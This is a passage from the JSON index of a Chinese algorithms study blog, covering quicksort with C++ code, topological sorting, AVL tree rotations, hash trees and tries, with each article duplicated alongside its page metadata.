对于基准数左、右两边的数组，不断重复以上两个过程，直到每个子集只有一个元素，即为全部有序。\n\n例如有一需要排序的数组为：23,45,17,11,13,89,72,26,3,17,11,13（从小到大排序）：\n\n选取数组第一个数23为基准数，存入temp变量中，从数组的左右两边界向中间进行遍历，定义两个指针 i 和 j，i 最开始指向数组的第一个元素，j 最开始指向数组的最后一个元素。指针 i 从左向右移动，指针 j 从右向左移动。先移动 j 指针（从右忘左移），当 j 指向的数大于基准数时，略过，j 继续往左移动，直到遇到小于等于基准数的数arr[j]，将arr[j]填入arr[i]中；再移动 i 指针，当 i 指向的数小于等于基准数时，略过，i 继续往右移动，直到遇到不比基准数小的数arr[i]，将arr[i]填入arr[j]中；再移动 i 指针，再移动 j 指针...(轮换移动)，直到 i 和 j 指针相遇，此时将temp（基准数）填入arr[i]中即完成算法的第2个步骤。接下来分别将基准数左边和右边的数组按照以上方法进行聚合，直到每个子集只有一个元素，即排序完成。\n\n可能描述得有些抽象，接下来用图一步一步的示意：\n\n将数组第一个数23赋给temp变量，指针 i 指向数组第一个元素，指针 j 指向数组最后一个元素\n\n\n\n从 j 开始遍历（从右往左），遇到13时，因为13<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为13；\n\n\n\n再从 i 遍历（从左往右），遇到45时，因为45>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为45；\n\n\n\n继续从 j 遍历，遇到11时，因为11<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为11；\n\n\n\n从 i 遍历，遇到89时，因为89>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为89；\n\n\n\n从 j 遍历，遇到17时，因为17<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为17；\n\n\n\n从 i 遍历，遇到72时，因为72>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为72；\n\n\n\n从 j 遍历，遇到3时，因为3<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为3；\n\n\n\n从 i 遍历，遇到26时，因为26>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为26；\n\n\n\n从 j 遍历，和 i 重合；\n\n\n\n将 temp（基准数23）填入arr[i]中。\n\n\n\n此时完成算法的第2个步骤，接下来将23左边和右边的子区间分别用以上方法进行排序，直到区间只有一个元素即排序完成。\n\n代码如下：\n\n// 快速排序算法\n#include "stdafx.h"\n#include<iostream>\nusing namespace std;\n \n//快速排序算法(从小到大)\n//arr:需要排序的数组，begin:需要排序的区间左边界，end:需要排序的区间的右边界\nvoid quickSort(int *arr,int begin,int end)\n{\n\t//如果区间不只一个数\n\tif(begin < end)\n\t{\n\t\tint temp = arr[begin]; //将区间的第一个数作为基准数\n\t\tint i = begin; //从左到右进行查找时的“指针”，指示当前左位置\n\t\tint j = end; //从右到左进行查找时的“指针”，指示当前右位置\n\t\t//不重复遍历\n\t\twhile(i < j)\n\t\t{\n\t\t\t//当右边的数大于基准数时，略过，继续向左查找\n\t\t\t//不满足条件时跳出循环，此时的j对应的元素是小于基准元素的\n\t\t\twhile(i<j && arr[j] > temp)\n\t\t\t\tj--;\n\t\t\t//将右边小于等于基准元素的数填入右边相应位置\n\t\t\tarr[i] = arr[j];\n\t\t\t//当左边的数小于等于基准数时，略过，继续向右查找\n\t\t\t//(重复的基准元素集合到左区间)\n\t\t\t//不满足条件时跳出循环，此时的i对应的元素是大于等于基准元素的\n\t\t\twhile(i<j && arr[i] <= temp)\n\t\t\t\ti++;\n\t\t\t//将左边大于基准元素的数填入左边相应位置\n\t\t\tarr[j] = arr[i];\n\t\t}\n\t\t//将基准元素填入相应位置\n\t\tarr[i] = temp;\n\t\t//此时的i即为基准元素的位置\n\t\t//对基准元素的左边子区间进行相似的快速排序\n\t\tquickSort(arr,begin,i-1);\n\t\t//对基准元素的右边子区间进行相似的快速排序\n\t\tquickSort(arr,i+1,end);\n\t}\n\t//如果区间只有一个数，则返回\n\telse\n\t\treturn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n',normalizedContent:'最开始学习编程，遇到排序问题，一般都是用冒泡法，因为冒泡法好理解，代码量少。但是这种算法时间复杂度高，当需要排序的元素较多时，程序运行时间很长，因此产生了快速排序算法。该算法的实现可分为以下几步：\n\n 1. 在数组中选一个基准数（通常为数组第一个）；\n\n 2. 将数组中小于基准数的数据移到基准数左边，大于基准数的移到右边；\n\n 3. 对于基准数左、右两边的数组，不断重复以上两个过程，直到每个子集只有一个元素，即为全部有序。\n\n例如有一需要排序的数组为：23,45,17,11,13,89,72,26,3,17,11,13（从小到大排序）：\n\n选取数组第一个数23为基准数，存入temp变量中，从数组的左右两边界向中间进行遍历，定义两个指针 i 和 j，i 最开始指向数组的第一个元素，j 最开始指向数组的最后一个元素。指针 i 从左向右移动，指针 j 从右向左移动。先移动 j 指针（从右忘左移），当 j 指向的数大于基准数时，略过，j 继续往左移动，直到遇到小于等于基准数的数arr[j]，将arr[j]填入arr[i]中；再移动 i 指针，当 i 指向的数小于等于基准数时，略过，i 继续往右移动，直到遇到不比基准数小的数arr[i]，将arr[i]填入arr[j]中；再移动 i 指针，再移动 j 指针...(轮换移动)，直到 i 和 j 指针相遇，此时将temp（基准数）填入arr[i]中即完成算法的第2个步骤。接下来分别将基准数左边和右边的数组按照以上方法进行聚合，直到每个子集只有一个元素，即排序完成。\n\n可能描述得有些抽象，接下来用图一步一步的示意：\n\n将数组第一个数23赋给temp变量，指针 i 指向数组第一个元素，指针 j 指向数组最后一个元素\n\n\n\n从 j 开始遍历（从右往左），遇到13时，因为13<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为13；\n\n\n\n再从 i 遍历（从左往右），遇到45时，因为45>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为45；\n\n\n\n继续从 j 遍历，遇到11时，因为11<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为11；\n\n\n\n从 i 遍历，遇到89时，因为89>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为89；\n\n\n\n从 j 遍历，遇到17时，因为17<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为17；\n\n\n\n从 i 遍历，遇到72时，因为72>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为72；\n\n\n\n从 j 遍历，遇到3时，因为3<=temp，因此将arr[j]填入arr[i]中，即此时指针 i 指向的数为3；\n\n\n\n从 i 遍历，遇到26时，因为26>temp，因此将arr[i]填入arr[j]中，此时指针 j 指向的数为26；\n\n\n\n从 j 遍历，和 i 重合；\n\n\n\n将 temp（基准数23）填入arr[i]中。\n\n\n\n此时完成算法的第2个步骤，接下来将23左边和右边的子区间分别用以上方法进行排序，直到区间只有一个元素即排序完成。\n\n代码如下：\n\n// 快速排序算法\n#include "stdafx.h"\n#include<iostream>\nusing namespace std;\n \n//快速排序算法(从小到大)\n//arr:需要排序的数组，begin:需要排序的区间左边界，end:需要排序的区间的右边界\nvoid quicksort(int *arr,int begin,int end)\n{\n\t//如果区间不只一个数\n\tif(begin < end)\n\t{\n\t\tint temp = arr[begin]; //将区间的第一个数作为基准数\n\t\tint i = begin; //从左到右进行查找时的“指针”，指示当前左位置\n\t\tint j = end; //从右到左进行查找时的“指针”，指示当前右位置\n\t\t//不重复遍历\n\t\twhile(i < j)\n\t\t{\n\t\t\t//当右边的数大于基准数时，略过，继续向左查找\n\t\t\t//不满足条件时跳出循环，此时的j对应的元素是小于基准元素的\n\t\t\twhile(i<j && arr[j] > temp)\n\t\t\t\tj--;\n\t\t\t//将右边小于等于基准元素的数填入右边相应位置\n\t\t\tarr[i] = arr[j];\n\t\t\t//当左边的数小于等于基准数时，略过，继续向右查找\n\t\t\t//(重复的基准元素集合到左区间)\n\t\t\t//不满足条件时跳出循环，此时的i对应的元素是大于等于基准元素的\n\t\t\twhile(i<j && arr[i] <= temp)\n\t\t\t\ti++;\n\t\t\t//将左边大于基准元素的数填入左边相应位置\n\t\t\tarr[j] = arr[i];\n\t\t}\n\t\t//将基准元素填入相应位置\n\t\tarr[i] = temp;\n\t\t//此时的i即为基准元素的位置\n\t\t//对基准元素的左边子区间进行相似的快速排序\n\t\tquicksort(arr,begin,i-1);\n\t\t//对基准元素的右边子区间进行相似的快速排序\n\t\tquicksort(arr,i+1,end);\n\t}\n\t//如果区间只有一个数，则返回\n\telse\n\t\treturn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"05拓扑排序",frontmatter:{title:"05拓扑排序",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/c4ea10/",categories:["数据结构与算法","排序"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/03.%E6%8E%92%E5%BA%8F/05%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F.html",relativePath:"01.数据结构与算法/03.排序/05拓扑排序.md",key:"v-423f10bf",path:"/pages/c4ea10/",headersStr:null,content:"# 一、什么是拓扑排序\n\n在图论中，拓扑排序（Topological Sorting） 是一个 有向无环图（DAG, Directed Acyclic Graph 的所有顶点的线性序列。且该序列必须满足下面两个条件：\n\n 1. 每个顶点出现且只出现一次。\n 2. 若存在一条从顶点 A 到顶点 B 的路径，那么在序列中顶点 A 出现在顶点 B 的前面。\n\n有向无环图（DAG）才有拓扑排序，非DAG图没有拓扑排序一说。\n\n例如，下面这个图：\n\n\n\n它是一个 DAG 图，那么如何写出它的拓扑排序呢？这里说一种比较常用的方法：\n\n 1. 从 DAG 图中选择一个 没有前驱（即入度为0）的顶点并输出。\n 2. 从图中删除该顶点和所有以它为起点的有向边。\n 3. 重复 1 和 2 直到当前的 DAG 图为空或当前图中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环。\n\n\n\n于是，得到拓扑排序后的结果是 { 1, 2, 4, 3, 5 }。\n\n通常，一个有向无环图可以有一个或多个拓扑排序序列。",normalizedContent:"# 一、什么是拓扑排序\n\n在图论中，拓扑排序（topological sorting） 是一个 有向无环图（dag, directed acyclic graph 的所有顶点的线性序列。且该序列必须满足下面两个条件：\n\n 1. 每个顶点出现且只出现一次。\n 2. 若存在一条从顶点 a 到顶点 b 的路径，那么在序列中顶点 a 出现在顶点 b 的前面。\n\n有向无环图（dag）才有拓扑排序，非dag图没有拓扑排序一说。\n\n例如，下面这个图：\n\n\n\n它是一个 dag 图，那么如何写出它的拓扑排序呢？这里说一种比较常用的方法：\n\n 1. 从 dag 图中选择一个 没有前驱（即入度为0）的顶点并输出。\n 2. 从图中删除该顶点和所有以它为起点的有向边。\n 3. 重复 1 和 2 直到当前的 dag 图为空或当前图中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环。\n\n\n\n于是，得到拓扑排序后的结果是 { 1, 2, 4, 3, 5 }。\n\n通常，一个有向无环图可以有一个或多个拓扑排序序列。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"平衡二叉树",frontmatter:{title:"平衡二叉树",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/d681c3/",categories:["数据结构与算法","树"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/04.%E6%A0%91/01.%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.html",relativePath:"01.数据结构与算法/04.树/01.平衡二叉树.md",key:"v-2a30c810",path:"/pages/d681c3/",headers:[{level:2,title:"1. LL型调整：",slug:"_1-ll型调整",normalizedTitle:"1. ll型调整：",charIndex:1336},{level:2,title:"2. RR型调整：",slug:"_2-rr型调整",normalizedTitle:"2. rr型调整：",charIndex:1642},{level:2,title:"3. LR型调整",slug:"_3-lr型调整",normalizedTitle:"3. lr型调整",charIndex:1967},{level:2,title:"4. RL型调整：",slug:"_4-rl型调整",normalizedTitle:"4. rl型调整：",charIndex:2314}],headersStr:"1. LL型调整： 2. RR型调整： 3. LR型调整 4. RL型调整：",content:"# 一、AVL树简介\n\n> AVL树的名字来源于它的发明作者G.M. Adelson-Velsky 和 E.M. Landis。AVL树是最先发明的自平衡二叉查找树（Self-Balancing Binary Search Tree,简称平衡二叉树）。\n> \n> 平衡二叉树定义(AVL)：它或者是一颗空树，或者具有以下性质的二叉排序树：它的左子树和右子树的深度之差(平衡因子)的绝对值不超过1，且它的左子树和右子树都是一颗平衡二叉树。\n\n一棵AVL树有如下必要条件：\n\n 1. 条件一：它必须是二叉查找树。\n 2. 条件二：每个节点的左子树和右子树的高度差至多为1。\n\n\n\n图一中左边二叉树的节点45的左孩子46比45大，不满足二叉搜索树的条件，因此它也不是一棵平衡二叉树。 右边二叉树满足二叉搜索树的条件，同时它满足条件二，因此它是一棵平衡二叉树。\n\n\n\n左边二叉树的节点45左子树高度2，右子树高度0，左右子树高度差为2-0=2，不满足条件二； 右边二叉树的节点均满足左右子树高度差至多为1，同时它满足二叉搜索树的要求，因此它是一棵平衡二叉树。\n\nAVL树的查找、插入、删除操作在平均和最坏的情况下都是O（logn），这得益于它时刻维护着二叉树的平衡。如果我们需要查找的集合本身没有顺序，在频繁查找的同时也经常的插入和删除，AVL树是不错的选择。不平衡的二叉查找树在查找时的效率是很低的，因此，AVL如何维护二叉树的平衡是我们的学习重点。\n\n\n# 二、AVL树相关概念\n\n1. 平衡因子：将二叉树上节点的左子树高度减去右子树高度的值称为该节点的平衡因子BF(Balance Factor)。     在图二右边的AVL树上：     节点50的左子树高度为3，右子树高度为2，BF= 3-2 = 1；     节点45的左子树高度为2，右子树高度为1，BF= 2-1 = 1；     节点46的左子树高度为0，右子树高度为0，BF= 0-0 = 0；     节点65的左子树高度为0，右子树高度为1，BF= 0-1 = -1；     对于平衡二叉树，BF的取值范围为[-1,1]。如果发现某个节点的BF值不在此范围，则需要对树进行调整。\n\n2. 最小不平衡子树：距离插入节点最近的，且平衡因子的绝对值大于1的节点为根的子树.。\n\n\n\n在图三中，左边二叉树的节点45的BF = 1，插入节点43后，节点45的BF = 2。节点45是距离插入点43最近的BF不在[-1,1]范围内的节点，因此以节点45为根的子树为最小不平衡子树。\n\n\n# 三、AVL树的平衡调整\n\n定义平衡二叉树节点结构：\n\ntypedef struct Node{\n\tint key;\n\tstruct Node *left;\n\tstruct Node *right;\n\tint height;\n}BTNode;\n\n\n1\n2\n3\n4\n5\n6\n\n\n整个实现过程是通过在一棵平衡二叉树中依次插入元素(按照二叉排序树的方式)，若出现不平衡，则要根据新插入的结点与最低不平衡结点的位置关系进行相应的调整。分为LL型、RR型、LR型和RL型4种类型，各调整方法如下(下面用A表示最低不平衡结点)：\n\n\n# 1. LL型调整：\n\n> 由于在A的左孩子(L)的左子树(L)上插入新结点，使原来平衡二叉树变得不平衡，此时A的平衡因子由1增至2。下面图1是LL型的最简单形式。显然，按照大小关系，结点B应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡，A结点就好像是绕结点B顺时针旋转一样。\n\n\n\n> LL型调整的一般形式如下图2所示，表示在A的左孩子B的左子树BL(不一定为空)中插入结点(图中阴影部分所示)而导致不平衡( h 表示子树的深度)。这种情况调整如下：①将A的左孩子B提升为新的根结点；②将原来的根结点A降为B的右孩子；③各子树按大小关系连接(BL和AR不变，BR调整为A的左子树)。\n\n\n\n\n\n\n# 2. RR型调整：\n\n> 由于在A的右孩子(R)的右子树(R)上插入新结点，使原来平衡二叉树变得不平衡，此时A的平衡因子由-1变为-2。图3是RR型的最简单形式。显然，按照大小关系，结点B应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡，A结点就好像是绕结点B逆时针旋转一样。\n\n\n\n> RR型调整的一般形式如下图4所示，表示在A的右孩子B的右子树BR(不一定为空)中插入结点(图中阴影部分所示)而导致不平衡( h 表示子树的深度)。这种情况调整如下：\n> \n>  * 将A的右孩子B提升为新的根结点；\n>  * 将原来的根结点A降为B的左孩子\n>  * 各子树按大小关系连接(AL和BR不变，BL调整为A的右子树)。\n\n\n\n\n\n\n\n\n# 3. LR型调整\n\n> 由于在A的左孩子(L)的右子树(R)上插入新结点，使原来平衡二叉树变得不平衡，此时A的平衡因子由1变为2。图5是LR型的最简单形式。显然，按照大小关系，结点C应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡。\n\n\n\n\n\n> LR型调整的一般形式如下图6所示，表示在A的左孩子B的右子树(根结点为C，不一定为空)中插入结点(图中两个阴影部分之一)而导致不平衡( h 表示子树的深度)。这种情况调整如下：①将B的左孩子C提升为新的根结点；②将原来的根结点A降为C的右孩子；③各子树按大小关系连接(BL和AR不变，CL和CR分别调整为B的右子树和A的左子树)。\n\n\n\n\n\n\n\n----------------------------------------\n\n\n# 4. RL型调整：\n\n * 由于在A的右孩子(R)的左子树(L)上插入新结点，使原来平衡二叉树变得不平衡，此时A的平衡因子由-1变为-2。图7是RL型的最简单形式。显然，按照大小关系，结点C应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡。\n\n\n\n\n\n * RL型调整的一般形式如下图8所示，表示在A的右孩子B的左子树(根结点为C，不一定为空)中插入结点(图中两个阴影部分之一)而导致不平衡( h 表示子树的深度)。这种情况调整如下：①将B的左孩子C提升为新的根结点；②将原来的根结点A降为C的左孩子；③各子树按大小关系连接(AL和BR不变，CL和CR分别调整为A的右子树和B的左子树)。\n\n\n\n",normalizedContent:"# 一、avl树简介\n\n> avl树的名字来源于它的发明作者g.m. adelson-velsky 和 e.m. landis。avl树是最先发明的自平衡二叉查找树（self-balancing binary search tree,简称平衡二叉树）。\n> \n> 平衡二叉树定义(avl)：它或者是一颗空树，或者具有以下性质的二叉排序树：它的左子树和右子树的深度之差(平衡因子)的绝对值不超过1，且它的左子树和右子树都是一颗平衡二叉树。\n\n一棵avl树有如下必要条件：\n\n 1. 条件一：它必须是二叉查找树。\n 2. 条件二：每个节点的左子树和右子树的高度差至多为1。\n\n\n\n图一中左边二叉树的节点45的左孩子46比45大，不满足二叉搜索树的条件，因此它也不是一棵平衡二叉树。 右边二叉树满足二叉搜索树的条件，同时它满足条件二，因此它是一棵平衡二叉树。\n\n\n\n左边二叉树的节点45左子树高度2，右子树高度0，左右子树高度差为2-0=2，不满足条件二； 右边二叉树的节点均满足左右子树高度差至多为1，同时它满足二叉搜索树的要求，因此它是一棵平衡二叉树。\n\navl树的查找、插入、删除操作在平均和最坏的情况下都是o（logn），这得益于它时刻维护着二叉树的平衡。如果我们需要查找的集合本身没有顺序，在频繁查找的同时也经常的插入和删除，avl树是不错的选择。不平衡的二叉查找树在查找时的效率是很低的，因此，avl如何维护二叉树的平衡是我们的学习重点。\n\n\n# 二、avl树相关概念\n\n1. 平衡因子：将二叉树上节点的左子树高度减去右子树高度的值称为该节点的平衡因子bf(balance factor)。     在图二右边的avl树上：     节点50的左子树高度为3，右子树高度为2，bf= 3-2 = 1；     节点45的左子树高度为2，右子树高度为1，bf= 2-1 = 1；     节点46的左子树高度为0，右子树高度为0，bf= 0-0 = 0；     节点65的左子树高度为0，右子树高度为1，bf= 0-1 = -1；     对于平衡二叉树，bf的取值范围为[-1,1]。如果发现某个节点的bf值不在此范围，则需要对树进行调整。\n\n2. 最小不平衡子树：距离插入节点最近的，且平衡因子的绝对值大于1的节点为根的子树.。\n\n\n\n在图三中，左边二叉树的节点45的bf = 1，插入节点43后，节点45的bf = 2。节点45是距离插入点43最近的bf不在[-1,1]范围内的节点，因此以节点45为根的子树为最小不平衡子树。\n\n\n# 三、avl树的平衡调整\n\n定义平衡二叉树节点结构：\n\ntypedef struct node{\n\tint key;\n\tstruct node *left;\n\tstruct node *right;\n\tint height;\n}btnode;\n\n\n1\n2\n3\n4\n5\n6\n\n\n整个实现过程是通过在一棵平衡二叉树中依次插入元素(按照二叉排序树的方式)，若出现不平衡，则要根据新插入的结点与最低不平衡结点的位置关系进行相应的调整。分为ll型、rr型、lr型和rl型4种类型，各调整方法如下(下面用a表示最低不平衡结点)：\n\n\n# 1. ll型调整：\n\n> 由于在a的左孩子(l)的左子树(l)上插入新结点，使原来平衡二叉树变得不平衡，此时a的平衡因子由1增至2。下面图1是ll型的最简单形式。显然，按照大小关系，结点b应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡，a结点就好像是绕结点b顺时针旋转一样。\n\n\n\n> ll型调整的一般形式如下图2所示，表示在a的左孩子b的左子树bl(不一定为空)中插入结点(图中阴影部分所示)而导致不平衡( h 表示子树的深度)。这种情况调整如下：①将a的左孩子b提升为新的根结点；②将原来的根结点a降为b的右孩子；③各子树按大小关系连接(bl和ar不变，br调整为a的左子树)。\n\n\n\n\n\n\n# 2. rr型调整：\n\n> 由于在a的右孩子(r)的右子树(r)上插入新结点，使原来平衡二叉树变得不平衡，此时a的平衡因子由-1变为-2。图3是rr型的最简单形式。显然，按照大小关系，结点b应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡，a结点就好像是绕结点b逆时针旋转一样。\n\n\n\n> rr型调整的一般形式如下图4所示，表示在a的右孩子b的右子树br(不一定为空)中插入结点(图中阴影部分所示)而导致不平衡( h 表示子树的深度)。这种情况调整如下：\n> \n>  * 将a的右孩子b提升为新的根结点；\n>  * 将原来的根结点a降为b的左孩子\n>  * 各子树按大小关系连接(al和br不变，bl调整为a的右子树)。\n\n\n\n\n\n\n\n\n# 3. lr型调整\n\n> 由于在a的左孩子(l)的右子树(r)上插入新结点，使原来平衡二叉树变得不平衡，此时a的平衡因子由1变为2。图5是lr型的最简单形式。显然，按照大小关系，结点c应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡。\n\n\n\n\n\n> lr型调整的一般形式如下图6所示，表示在a的左孩子b的右子树(根结点为c，不一定为空)中插入结点(图中两个阴影部分之一)而导致不平衡( h 表示子树的深度)。这种情况调整如下：①将b的左孩子c提升为新的根结点；②将原来的根结点a降为c的右孩子；③各子树按大小关系连接(bl和ar不变，cl和cr分别调整为b的右子树和a的左子树)。\n\n\n\n\n\n\n\n----------------------------------------\n\n\n# 4. rl型调整：\n\n * 由于在a的右孩子(r)的左子树(l)上插入新结点，使原来平衡二叉树变得不平衡，此时a的平衡因子由-1变为-2。图7是rl型的最简单形式。显然，按照大小关系，结点c应作为新的根结点，其余两个节点分别作为左右孩子节点才能平衡。\n\n\n\n\n\n * rl型调整的一般形式如下图8所示，表示在a的右孩子b的左子树(根结点为c，不一定为空)中插入结点(图中两个阴影部分之一)而导致不平衡( h 表示子树的深度)。这种情况调整如下：①将b的左孩子c提升为新的根结点；②将原来的根结点a降为c的左孩子；③各子树按大小关系连接(al和br不变，cl和cr分别调整为a的右子树和b的左子树)。\n\n\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Hash树",frontmatter:{title:"Hash树",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/82d820/",categories:["数据结构与算法","树"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/04.%E6%A0%91/02.Hash%E6%A0%91.html",relativePath:"01.数据结构与算法/04.树/02.Hash树.md",key:"v-23ffbece",path:"/pages/82d820/",headersStr:null,content:"理想的状况是但愿不通过任何比较，一次存取便能获得所查的记录， 那就必须在记的存储位置和它的关键字之间创建一个肯定的对应关系f，使每一个关键字和一个惟一的存储位置相对应。于是在查找时，只要根据这个对应关系f找到 给定值K的像f(K)。由此，不须要进行比较即可直接取得所查记录。在此，咱们称这个对应关系为哈希（Hash）函数，按这个思想创建的表为哈希表。\n\n在哈希表中对于不一样的关键字可能获得同一哈希地址，这种现象称作冲突。在通常状况下，冲突只能尽量地减小，而不能彻底避免。由于哈希函数是从关键字集合 到地址集合的映像。一般关键字的集合比较大，它的元素包括全部可能的关键字，而地址集合的元素仅为哈希表中的地址值。在通常状况下，哈希函数是一个压缩映像函数，这就不可避免的要产生冲突。\n\n\n# 哈希树的理论基础\n\n【质数分辨定理】 简单地说就是：n个不一样的质数能够“分辨”的连续整数的个数和他们的乘积相等。“分辨”就是指这些连续的整数不可能有彻底相同的余数序列。\n\n例如： 从2起的连续质数，连续10个质数就能够分辨大约M(10) =2*3*5*7*11*13*17*19*23*29= 6464693230个数，已经超过计算机中经常使用整数（32bit）的表达范围。连续100个质数就能够分辨大约M(100) = 4.711930乘以10的219次方。\n\n\n# 插入\n\n咱们选择质数分辨算法来创建一棵哈希树。 选择从2开始的连续质数来创建一个十层的哈希树。第一层结点为根结点，根结点下有2个结点；第二层的每一个结点下有3个结点；依此类推，即每层结点的子节点数目为连续的质数。到第十层，每一个结点下有29个结点。 同一结点中的子结点，从左到右表明不一样的余数结果。 例如：第二层结点下有三个子节点。那么从左到右分别表明：除3余0，除3余1，除3余2. 对质数进行取余操做获得的余数决定了处理的路径。",normalizedContent:"理想的状况是但愿不通过任何比较，一次存取便能获得所查的记录， 那就必须在记的存储位置和它的关键字之间创建一个肯定的对应关系f，使每一个关键字和一个惟一的存储位置相对应。于是在查找时，只要根据这个对应关系f找到 给定值k的像f(k)。由此，不须要进行比较即可直接取得所查记录。在此，咱们称这个对应关系为哈希（hash）函数，按这个思想创建的表为哈希表。\n\n在哈希表中对于不一样的关键字可能获得同一哈希地址，这种现象称作冲突。在通常状况下，冲突只能尽量地减小，而不能彻底避免。由于哈希函数是从关键字集合 到地址集合的映像。一般关键字的集合比较大，它的元素包括全部可能的关键字，而地址集合的元素仅为哈希表中的地址值。在通常状况下，哈希函数是一个压缩映像函数，这就不可避免的要产生冲突。\n\n\n# 哈希树的理论基础\n\n【质数分辨定理】 简单地说就是：n个不一样的质数能够“分辨”的连续整数的个数和他们的乘积相等。“分辨”就是指这些连续的整数不可能有彻底相同的余数序列。\n\n例如： 从2起的连续质数，连续10个质数就能够分辨大约m(10) =2*3*5*7*11*13*17*19*23*29= 6464693230个数，已经超过计算机中经常使用整数（32bit）的表达范围。连续100个质数就能够分辨大约m(100) = 4.711930乘以10的219次方。\n\n\n# 插入\n\n咱们选择质数分辨算法来创建一棵哈希树。 选择从2开始的连续质数来创建一个十层的哈希树。第一层结点为根结点，根结点下有2个结点；第二层的每一个结点下有3个结点；依此类推，即每层结点的子节点数目为连续的质数。到第十层，每一个结点下有29个结点。 同一结点中的子结点，从左到右表明不一样的余数结果。 例如：第二层结点下有三个子节点。那么从左到右分别表明：除3余0，除3余1，除3余2. 对质数进行取余操做获得的余数决定了处理的路径。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"trie树（前缀树_字典树）",frontmatter:{title:"trie树（前缀树_字典树）",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/f86449/",categories:["数据结构与算法","树"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/04.%E6%A0%91/03.trie%E6%A0%91%EF%BC%88%E5%89%8D%E7%BC%80%E6%A0%91_%E5%AD%97%E5%85%B8%E6%A0%91%EF%BC%89.html",relativePath:"01.数据结构与算法/04.树/03.trie树（前缀树_字典树）.md",key:"v-48338b9c",path:"/pages/f86449/",headersStr:null,content:"Trie树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树 Hash树 的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。\n\nTrie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。\n\n它有3个基本性质：\n\n * 根节点不包含字符，除根节点外每一个节点都只包含一个字符。\n * 从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。\n * 每个节点的所有子节点包含的字符都不相同。\n\n\n# 作用\n\n 1. 能够保存一些字符串->值的对应关系。基本上，它跟 Java 的 HashMap 功能相同，都是 key-value 映射，只不过 Trie 的 key 只能是字符串。\n 2. 前缀查询\n 3. 查询\n\n\n# 优点\n\nTrie 的强大之处就在于它的时间复杂度。它的插入和查询时间复杂度都为 O(k) ，其中 k 为 key 的长度，与 Trie 中保存了多少个元素无关。Hash 表号称是 O(1) 的，但在计算 hash 的时候就确定会是 O(k) ，并且还有碰撞之类的问题；Trie 的缺点是空间消耗很高。\n\n\n# 例子\n\n题目：给你100000个长度不超过10的单词。对于每一个单词，我们要判断他出没出现过，如果出现了，求第一次出现在第几个位置。\n\n分析：这题当然可以用hash来解决，但是本文重点介绍的是trie树，因为在某些方面它的用途更大。比如说对于某一个单词，我们要询问它的前缀是否出现过。这样hash就不好搞了，而用trie还是很简单。\n\n如果我们用最傻的方法，对于每一个单词，我们都要去查找它前面的单词中是否有它。那么这个算法的复杂度就是O(n^2)。显然对于100000的范围难以接受。 